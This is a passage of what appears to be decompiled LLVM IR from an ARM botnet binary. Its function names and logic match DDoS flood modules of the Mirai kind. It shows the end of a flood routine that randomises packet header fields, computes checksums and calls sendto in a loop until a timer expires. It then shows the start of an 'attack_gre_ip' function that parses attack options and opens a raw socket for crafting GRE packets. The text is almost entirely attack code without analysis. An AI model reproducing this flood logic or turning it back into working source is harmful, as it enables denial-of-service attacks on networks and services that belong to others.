  %v3_8d58 = trunc i32 %v2_8d58 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_8d60 = load i32, i32* @r5, align 4
  %v4_8d60 = add i32 %v3_8d60, 10
  %v5_8d60 = inttoptr i32 %v4_8d60 to i16*
  store i16 %v3_8d58, i16* %v5_8d60, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8d68 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d68 = trunc i32 %v0_8d68 to i16
  %v2_8d68 = load i32, i32* @r6, align 4
  %v3_8d68 = add i32 %v2_8d68, 10
  %v4_8d68 = inttoptr i32 %v3_8d68 to i16*
  store i16 %v1_8d68, i16* %v4_8d68, align 2
  %v0_8d6c = load i32, i32* @r6, align 4
  store i32 %v0_8d6c, i32* @r0, align 4
  %v2_8d70 = call i32 @checksum_generic(i32 %v0_8d6c, i32 20)
  %v3_8d70 = trunc i32 %v2_8d70 to i16
  store i32 %v2_8d70, i32* %r0.global-to-local, align 4
  %v3_8d74 = load i32, i32* @r6, align 4
  %v4_8d74 = add i32 %v3_8d74, 10
  %v5_8d74 = inttoptr i32 %v4_8d74 to i16*
  store i16 %v3_8d70, i16* %v5_8d74, align 2
  %v2_8d7c = load i32, i32* @r8, align 4
  %v3_8d7c = add i32 %v2_8d7c, 6
  %v4_8d7c = inttoptr i32 %v3_8d7c to i16*
  store i16 0, i16* %v4_8d7c, align 2
  %v0_8d80 = load i32, i32* @r8, align 4
  store i32 %v0_8d80, i32* @r1, align 4
  %v1_8d84 = add i32 %v0_8d80, 4
  %v2_8d84 = inttoptr i32 %v1_8d84 to i16*
  %v3_8d84 = load i16, i16* %v2_8d84, align 2
  %v4_8d84 = zext i16 %v3_8d84 to i32
  store i32 %v4_8d84, i32* %r2.global-to-local, align 4
  %v0_8d88 = load i32, i32* @fp, align 4
  store i32 %v0_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @r6, align 4
  store i32 %v0_8d8c, i32* %r0.global-to-local, align 4
  %v4_8d90 = call i32 @checksum_tcpudp(i32 %v0_8d8c, i32 %v0_8d80, i32 %v4_8d84, i32 %v0_8d88)
  %v5_8d90 = trunc i32 %v4_8d90 to i16
  store i32 %v4_8d90, i32* %r0.global-to-local, align 4
  %v3_8d94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8d94, i32* %r2.global-to-local, align 4
  %v3_8d98 = mul i32 %v3_8d94, 32
  store i32 %v3_8d98, i32* %r3.global-to-local, align 4
  %v0_8d9c = load i32, i32* @r5, align 4
  %v1_8d9c = add i32 %v0_8d9c, 16
  %v2_8d9c = inttoptr i32 %v1_8d9c to i32*
  %v3_8d9c = load i32, i32* %v2_8d9c, align 4
  %v5_8da0 = mul i32 %v3_8d94, 24
  store i32 %v5_8da0, i32* %r3.global-to-local, align 4
  %v1_8da4 = load i32, i32* @sl, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* @lr, align 4
  %v2_8da8 = add i32 %v2_8da4, 4
  %v3_8da8 = inttoptr i32 %v2_8da8 to i32*
  store i32 %v3_8d9c, i32* %v3_8da8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8db4 = load i32, i32* @r8, align 4
  %v4_8db4 = add i32 %v3_8db4, 6
  %v5_8db4 = inttoptr i32 %v4_8db4 to i16*
  store i16 %v5_8d90, i16* %v5_8db4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8dbc = load i32, i32* %r1.global-to-local, align 4
  %v1_8dbc = trunc i32 %v0_8dbc to i16
  %v2_8dbc = load i32, i32* %r3.global-to-local, align 4
  %v3_8dbc = load i32, i32* @sl, align 4
  %v4_8dbc = add i32 %v3_8dbc, %v2_8dbc
  %v5_8dbc = inttoptr i32 %v4_8dbc to i16*
  store i16 %v1_8dbc, i16* %v5_8dbc, align 2
  %v0_8dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_8dc0 = trunc i32 %v0_8dc0 to i16
  %v2_8dc0 = load i32, i32* @lr, align 4
  %v3_8dc0 = add i32 %v2_8dc0, 2
  %v4_8dc0 = inttoptr i32 %v3_8dc0 to i16*
  store i16 %v1_8dc0, i16* %v4_8dc0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8dc8 = load i32, i32* @r5, align 4
  store i32 %v0_8dc8, i32* %r1.global-to-local, align 4
  store i32 %v3_89fc, i32* %r0.global-to-local, align 4
  %v0_8dd0 = load i32, i32* @sb, align 4
  store i32 %v0_8dd0, i32* %r2.global-to-local, align 4
  %v0_8dd4 = load i32, i32* @lr, align 4
  %v0_8dd8 = load i32, i32* %ip.global-to-local, align 4
  %v6_8ddc = call i32 @__libc_sendto(i32 %v3_89fc, i32 %v0_8dc8, i32 %v0_8dd0, i32 16384, i32 %v0_8dd4, i32 %v0_8dd8)
  %v3_8de0 = load i32, i32* %stack_var_-44, align 4
  %v1_8de4 = add i32 %v3_8de0, 1
  store i32 %v1_8de4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_8dec = icmp eq i32 %v1_8de4, %arg2
  store i1 %v9_8dec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8de4, i32* %stack_var_-44, align 4
  %v6_8df4 = icmp slt i32 %v1_8de4, %arg2
  br i1 %v6_8df4, label %dec_label_pc_8df8, label %dec_label_pc_8f24

dec_label_pc_8df8:                                ; preds = %dec_label_pc_8d48, %dec_label_pc_8c84
  %v1_8e0c = phi i32 [ %v1_8de4, %dec_label_pc_8d48 ], [ 0, %dec_label_pc_8c84 ]
  %v5_8dfc = mul i32 %v1_8e0c, 24
  %v1_8e00 = load i32, i32* @sl, align 4
  %v2_8e00 = add i32 %v1_8e00, %v5_8dfc
  store i32 %v2_8e00, i32* %r3.global-to-local, align 4
  store i32 %v2_88b8, i32* %lr.global-to-local, align 4
  %v1_8e08 = add i32 %v2_8e00, 20
  %v2_8e08 = inttoptr i32 %v1_8e08 to i8*
  %v3_8e08 = load i8, i8* %v2_8e08, align 1
  %v4_8e08 = zext i8 %v3_8e08 to i32
  store i32 %v4_8e08, i32* %r2.global-to-local, align 4
  %v4_8e0c = mul i32 %v1_8e0c, 4
  %v5_8e0c = add i32 %v4_8e0c, %v2_88b8
  %v6_8e0c = inttoptr i32 %v5_8e0c to i32*
  %v7_8e0c = load i32, i32* %v6_8e0c, align 4
  store i32 %v7_8e0c, i32* @r5, align 4
  %v2_8e10 = icmp ugt i8 %v3_8e08, 30
  %v7_8e10 = icmp eq i8 %v3_8e08, 31
  store i1 %v7_8e10, i1* %cpsr_z.global-to-local, align 1
  %v1_8e14 = add i32 %v7_8e0c, 24
  store i32 %v1_8e14, i32* @r7, align 4
  %v1_8e18 = add i32 %v7_8e0c, 38
  store i32 %v1_8e18, i32* @r6, align 4
  %v1_8e1c = add i32 %v7_8e0c, 58
  store i32 %v1_8e1c, i32* @r8, align 4
  %v2_8e20 = xor i1 %v7_8e10, true
  %v3_8e20 = and i1 %v2_8e10, %v2_8e20
  br i1 %v3_8e20, label %dec_label_pc_8c98, label %dec_label_pc_8e24

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8df8
  %v1_8e24 = add i32 %v2_8e00, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* %r4.global-to-local, align 4
  %v0_8e28 = call i32 @rand_next()
  store i32 %v0_8e28, i32* %r0.global-to-local, align 4
  %v3_8e2c = load i32, i32* %stack_var_-44, align 4
  %v5_8e34 = mul i32 %v3_8e2c, 24
  %v1_8e38 = and i32 %v3_8e24, 16711680
  store i32 %v1_8e38, i32* %ip.global-to-local, align 4
  %v3_8e3c = udiv i32 %v3_8e24, 16777216
  %v4_8e40 = udiv i32 %v1_8e38, 256
  %v5_8e40 = or i32 %v4_8e40, %v3_8e3c
  store i32 %v5_8e40, i32* %r2.global-to-local, align 4
  %v1_8e44 = load i32, i32* @sl, align 4
  %v2_8e44 = add i32 %v1_8e44, %v5_8e34
  store i32 %v2_8e44, i32* %r1.global-to-local, align 4
  %v1_8e48 = and i32 %v3_8e24, 65280
  store i32 %v1_8e48, i32* %r3.global-to-local, align 4
  %v1_8e4c = add i32 %v2_8e44, 20
  %v2_8e4c = inttoptr i32 %v1_8e4c to i8*
  %v3_8e4c = load i8, i8* %v2_8e4c, align 1
  %v4_8e4c = zext i8 %v3_8e4c to i32
  store i32 %v4_8e4c, i32* %ip.global-to-local, align 4
  %v5_8e54 = call i32 @llvm.bswap.i32(i32 %v3_8e24)
  %v7_8e58 = lshr i32 %v0_8e28, %v4_8e4c
  %v8_8e58 = add i32 %v7_8e58, %v5_8e54
  store i32 %v8_8e58, i32* %r2.global-to-local, align 4
  %v1_8e5c = and i32 %v8_8e58, 16711680
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 %v6_89d8, i32* %r1.global-to-local, align 4
  %v5_8e74 = call i32 @llvm.bswap.i32(i32 %v8_8e58)
  store i32 %v5_8e74, i32* %r3.global-to-local, align 4
  store i1 %v7_8c9c, i1* %cpsr_z.global-to-local, align 1
  %v1_8e7c = load i32, i32* @r5, align 4
  %v2_8e7c = add i32 %v1_8e7c, 16
  %v3_8e7c = inttoptr i32 %v2_8e7c to i32*
  store i32 %v5_8e74, i32* %v3_8e7c, align 4
  br i1 %v2_8c9c, label %dec_label_pc_8e84, label %dec_label_pc_8ca4

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8e24, %dec_label_pc_8c98
  %v0_8e84 = call i32 @rand_next()
  store i32 %v0_8e84, i32* %r0.global-to-local, align 4
  store i32 %v3_8a4c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_8e94, i1* %cpsr_z.global-to-local, align 1
  %v1_8e98 = load i32, i32* @r5, align 4
  %v2_8e98 = add i32 %v1_8e98, 12
  %v3_8e98 = inttoptr i32 %v2_8e98 to i32*
  store i32 %v0_8e84, i32* %v3_8e98, align 4
  br i1 %v3_8e94, label %dec_label_pc_8ea0, label %dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge

dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge:    ; preds = %dec_label_pc_8e84
  %v1_8cbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_8cb8

dec_label_pc_8ea0:                                ; preds = %dec_label_pc_8e84, %dec_label_pc_8ca4
  %v0_8ea0 = call i32 @rand_next()
  %v3_8ea8 = urem i32 %v0_8ea0, 65536
  store i32 %v3_8ea8, i32* %r0.global-to-local, align 4
  %v1_8eb0 = sub nsw i32 999, %v3_8ea8
  store i32 %v1_8eb0, i32* %r3.global-to-local, align 4
  %v1_8eb4 = trunc i32 %v0_8ea0 to i16
  %v2_8eb4 = load i32, i32* @r5, align 4
  %v3_8eb4 = add i32 %v2_8eb4, 4
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 %v1_8eb4, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8eb8 = trunc i32 %v0_8eb8 to i16
  %v2_8eb8 = load i32, i32* @r6, align 4
  %v3_8eb8 = add i32 %v2_8eb8, 4
  %v4_8eb8 = inttoptr i32 %v3_8eb8 to i16*
  store i16 %v1_8eb8, i16* %v4_8eb8, align 2
  store i32 %v3_8a50, i32* %r3.global-to-local, align 4
  %v1_8ec0 = load i32, i32* @r4, align 4
  %v9_8ec0 = icmp eq i32 %v3_8a50, %v1_8ec0
  store i1 %v9_8ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ec0, label %dec_label_pc_8ec8, label %dec_label_pc_8cc4

dec_label_pc_8ec8:                                ; preds = %dec_label_pc_8ea0, %dec_label_pc_8cb8
  %v0_8ec8 = call i32 @rand_next()
  %v1_8ec8 = trunc i32 %v0_8ec8 to i16
  store i32 %v0_8ec8, i32* %r0.global-to-local, align 4
  store i32 %v3_8a54, i32* %ip.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @r4, align 4
  %v9_8ed0 = icmp eq i32 %v3_8a54, %v1_8ed0
  store i1 %v9_8ed0, i1* %cpsr_z.global-to-local, align 1
  %v3_8ed4 = load i32, i32* @r5, align 4
  %v4_8ed4 = add i32 %v3_8ed4, 58
  %v5_8ed4 = inttoptr i32 %v4_8ed4 to i16*
  store i16 %v1_8ec8, i16* %v5_8ed4, align 2
  br i1 %v9_8ed0, label %dec_label_pc_8edc, label %dec_label_pc_8cd0

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec8, %dec_label_pc_8cc4
  %v0_8edc = call i32 @rand_next()
  %v1_8edc = trunc i32 %v0_8edc to i16
  store i32 %v0_8edc, i32* %r0.global-to-local, align 4
  store i32 %v1_8a48, i32* @lr, align 4
  store i1 %v2_8ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ee4, label %.thread24, label %bb81

.thread24:                                        ; preds = %dec_label_pc_8edc
  %v3_8eec25 = load i32, i32* @r8, align 4
  %v4_8eec26 = add i32 %v3_8eec25, 2
  %v5_8eec27 = inttoptr i32 %v4_8eec26 to i16*
  store i16 %v1_8edc, i16* %v5_8eec27, align 2
  br label %dec_label_pc_8ef8

bb81:                                             ; preds = %dec_label_pc_8edc
  %v1_8ee8 = load i32, i32* @r5, align 4
  %v2_8ee8 = add i32 %v1_8ee8, 16
  %v3_8ee8 = inttoptr i32 %v2_8ee8 to i32*
  %v4_8ee8 = load i32, i32* %v3_8ee8, align 4
  store i32 %v4_8ee8, i32* %r3.global-to-local, align 4
  %v3_8eec = load i32, i32* @r8, align 4
  %v4_8eec = add i32 %v3_8eec, 2
  %v5_8eec = inttoptr i32 %v4_8eec to i16*
  store i16 %v1_8edc, i16* %v5_8eec, align 2
  %v1_8ef0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8ef0 = load i32, i32* @r6, align 4
  %v3_8ef0 = add i32 %v2_8ef0, 16
  %v4_8ef0 = inttoptr i32 %v3_8ef0 to i32*
  store i32 %v1_8ef0, i32* %v4_8ef0, align 4
  br label %dec_label_pc_8ce4

dec_label_pc_8ef8:                                ; preds = %.thread24, %dec_label_pc_8cd0
  %v0_8ef8 = call i32 @rand_next()
  store i32 %v0_8ef8, i32* %r0.global-to-local, align 4
  %v1_8efc = load i32, i32* @r6, align 4
  %v2_8efc = add i32 %v1_8efc, 16
  %v3_8efc = inttoptr i32 %v2_8efc to i32*
  store i32 %v0_8ef8, i32* %v3_8efc, align 4
  br label %dec_label_pc_8ce4

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8ce4
  %v0_8f04 = load i32, i32* @r8, align 4
  %v1_8f04 = add i32 %v0_8f04, 8
  store i32 %v1_8f04, i32* @r4, align 4
  store i32 %v1_8f04, i32* %r0.global-to-local, align 4
  store i32 %v6_8984, i32* %r1.global-to-local, align 4
  %v2_8f10 = call i32 @rand_alphastr(i32 %v1_8f04, i32 %v6_8984)
  store i32 %v2_8f10, i32* %r0.global-to-local, align 4
  store i32 %v6_8984, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8f1c = load i32, i32* @r4, align 4
  %v4_8f1c = add i32 %v2_8f1c, %v6_8984
  %v5_8f1c = inttoptr i32 %v4_8f1c to i8*
  store i8 0, i8* %v5_8f1c, align 1
  br label %dec_label_pc_8d48

dec_label_pc_8f24:                                ; preds = %dec_label_pc_8d48, %dec_label_pc_8c70
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8f28 = call i32 @__GI_time(i32* null)
  store i32 %v2_8f28, i32* %r0.global-to-local, align 4
  store i32 %v2_89e8, i32* %ip.global-to-local, align 4
  %v9_8f30 = icmp eq i32 %v2_89e8, %v2_8f28
  store i1 %v9_8f30, i1* %cpsr_z.global-to-local, align 1
  %v6_8f34 = icmp slt i32 %v2_89e8, %v2_8f28
  br i1 %v6_8f34, label %dec_label_pc_8f38, label %dec_label_pc_8c70

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f24, %entry, %dec_label_pc_8f44
  %v1_8f40 = phi i32 [ %v3_89fc, %entry ], [ %v1_8f48, %dec_label_pc_8f44 ], [ %v2_8f28, %dec_label_pc_8f24 ]
  store i32 %v3_888c, i32* %r4.global-to-local, align 4
  store i32 %v24_888c, i32* %fp.global-to-local, align 4
  store i32 %v27_888c, i32* %lr.global-to-local, align 4
  ret i32 %v1_8f40

dec_label_pc_8f44:                                ; preds = %dec_label_pc_8a0c
  store i32 %v3_89fc, i32* %r0.global-to-local, align 4
  %v1_8f48 = call i32 @__GI___libc_close(i32 %v3_89fc)
  store i32 %v1_8f48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f38

; uselistorder directives
  uselistorder i32 %v1_8f48, { 1, 0 }
  uselistorder i16 %v1_8edc, { 1, 0 }
  uselistorder i32 %v0_8edc, { 1, 0 }
  uselistorder i32 %v0_8ec8, { 1, 0 }
  uselistorder i32 %v1_8ec0, { 1, 0 }
  uselistorder i32 %v3_8ea8, { 1, 0 }
  uselistorder i32 %v0_8ea0, { 1, 0 }
  uselistorder i32 %v5_8e74, { 1, 0 }
  uselistorder i32 %v3_8e24, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_8e0c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8de4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_8d94, { 1, 0, 2 }
  uselistorder i32 %v4_8d90, { 1, 0 }
  uselistorder i32 %v2_8d70, { 1, 0 }
  uselistorder i1 %v2_8ee4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_8e94, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8c9c, { 2, 1, 0 }
  uselistorder i32 %v0_8c1c, { 1, 0, 2 }
  uselistorder i32 %v0_8b34, { 1, 2, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v1_8a88, { 2, 0, 1 }
  uselistorder i32 %v3_8a80, { 2, 1, 0 }
  uselistorder i1 %v2_8a58, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8a4c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8a48, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_8a44, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_8a40, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8a3c, { 1, 0 }
  uselistorder i1 %v7_8a2c, { 1, 0 }
  uselistorder i1 %v7_8a00, { 1, 0 }
  uselistorder i32 %v3_89fc, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_89e8, { 2, 1, 0 }
  uselistorder i32 %v6_89d8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_89a4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8984, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v6_8950, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8938, { 1, 2, 0 }
  uselistorder i32 %v1_8914, { 3, 2, 1, 0 }
  uselistorder i32 %v6_890c, { 1, 0 }
  uselistorder i32 %v6_88d0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_88b8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 46, 23, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 30, 27, 28, 29, 33, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 6, 5, 4, 1, 0, 3, 2, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_8f38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d48, { 1, 0 }
  uselistorder label %dec_label_pc_8ce4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8c70, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_8f54 = load i32, i32* @r4, align 4
  %v24_8f54 = load i32, i32* @fp, align 4
  %v27_8f54 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_8f80 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_8f84 = load i32, i32* @r4, align 4
  store i32 %v0_8f84, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_8f90 = load i32, i32* @sb, align 4
  store i32 %v0_8f90, i32* %r3.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  %v5_8f98 = inttoptr i32 %v0_8f84 to i32*
  %v6_8f98 = call i32 @attack_get_opt_int(i32 %v0_8f94, i32* %v5_8f98, i32 2, i32 %v0_8f90, i32 %v2_8f80)
  %v1_8fa4 = urem i32 %v6_8f98, 256
  store i32 %v1_8fa4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8fb0 = load i32, i32* @r4, align 4
  store i32 %v0_8fb0, i32* %r1.global-to-local, align 4
  %v0_8fb4 = load i32, i32* @r5, align 4
  %v5_8fb8 = trunc i32 %v6_8f98 to i8
  %v6_8fbc = inttoptr i32 %v0_8fb0 to i32*
  %v7_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb4, i32* %v6_8fbc, i32 3, i32 65535, i32 %v6_8f98)
  %v0_8fc0 = load i32, i32* @r4, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8fd0 = load i32, i32* @r5, align 4
  %v5_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v6_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v5_8fd4, i32 4, i32 64, i32 %v7_8fbc)
  %v1_8fdc = urem i32 %v6_8fd4, 256
  store i32 %v1_8fdc, i32* %ip.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r4, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fec = load i32, i32* @r5, align 4
  %v6_8ff4 = inttoptr i32 %v0_8fe0 to i32*
  %v7_8ff4 = call i32 @attack_get_opt_int(i32 %v0_8fec, i32* %v6_8ff4, i32 5, i32 1, i32 %v1_8fdc)
  %v1_9000 = urem i32 %v7_8ff4, 256
  store i32 %v1_9000, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_900c = load i32, i32* @r4, align 4
  store i32 %v0_900c, i32* %r1.global-to-local, align 4
  %v0_9010 = load i32, i32* @r5, align 4
  %v5_9018 = inttoptr i32 %v0_900c to i32*
  %v6_9018 = call i32 @attack_get_opt_int(i32 %v0_9010, i32* %v5_9018, i32 6, i32 65535, i32 %v1_9000)
  %v0_9020 = load i32, i32* @r4, align 4
  store i32 %v0_9020, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9018, i32* %fp.global-to-local, align 4
  %v0_9030 = load i32, i32* @r5, align 4
  %v5_9034 = inttoptr i32 %v0_9020 to i32*
  %v6_9034 = call i32 @attack_get_opt_int(i32 %v0_9030, i32* %v5_9034, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9038 = load i32, i32* @r4, align 4
  store i32 %v0_9038, i32* %r1.global-to-local, align 4
  %v0_903c = load i32, i32* @sb, align 4
  store i32 %v0_903c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9034, i32* @r8, align 4
  %v0_9048 = load i32, i32* @r5, align 4
  %v5_904c = inttoptr i32 %v0_9038 to i32*
  %v6_904c = call i32 @attack_get_opt_int(i32 %v0_9048, i32* %v5_904c, i32 %v0_903c, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_905c = load i32, i32* @r4, align 4
  store i32 %v0_905c, i32* %r1.global-to-local, align 4
  %v0_9060 = load i32, i32* @r5, align 4
  %v5_9064 = inttoptr i32 %v0_905c to i32*
  %v6_9064 = call i32 @attack_get_opt_int(i32 %v0_9060, i32* %v5_9064, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_906c = urem i32 %v6_9064, 256
  store i32 %v1_906c, i32* %ip.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  store i32 %v0_9070, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_9078 = load i32, i32* @sb, align 4
  store i32 %v0_9078, i32* %r3.global-to-local, align 4
  %v0_907c = load i32, i32* @r5, align 4
  %v5_9084 = inttoptr i32 %v0_9070 to i32*
  %v6_9084 = call i32 @attack_get_opt_int(i32 %v0_907c, i32* %v5_9084, i32 18, i32 %v0_9078, i32 %v1_906c)
  %v0_908c = load i32, i32* @r4, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v2_9090 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_9090, i32* %r3.global-to-local, align 4
  store i32 %v6_9084, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_909c = load i32, i32* @r5, align 4
  %v5_90a0 = inttoptr i32 %v0_908c to i32*
  %v6_90a0 = call i32 @attack_get_opt_int(i32 %v0_909c, i32* %v5_90a0, i32 24, i32 %v2_9090, i32 ptrtoint (i32* @0 to i32))
  %v0_90a8 = load i32, i32* @sb, align 4
  %v1_90ac = inttoptr i32 %v0_90a8 to i32*
  %v2_90ac = call i32 @__GI_time(i32* %v1_90ac)
  %v1_90b0 = load i32, i32* @r6, align 4
  %v2_90b0 = add i32 %v1_90b0, %v2_90ac
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_90c4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_90c8 = icmp eq i32 %v3_90c4, -1
  store i1 %v7_90c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90c8, label %dec_label_pc_9598, label %dec_label_pc_90d4

dec_label_pc_90d4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_90dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_90dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_90e4 = load i32, i32* @sb, align 4
  store i32 %v0_90e4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_90f0 = call i32 @__GI_setsockopt(i32 %v3_90c4, i32 %v0_90e4, i32 3, i32 %v6_90dc, i32 4)
  %v7_90f4 = icmp eq i32 %v5_90f0, -1
  store i1 %v7_90f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90f4, label %dec_label_pc_95a4, label %dec_label_pc_90fc

dec_label_pc_90fc:                                ; preds = %dec_label_pc_90d4
  %v0_90fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_9110 = load i32, i32* @r8, align 4
  %v3_9114 = mul i32 %v7_8fbc, 65536
  store i32 %v3_9114, i32* %r1.global-to-local, align 4
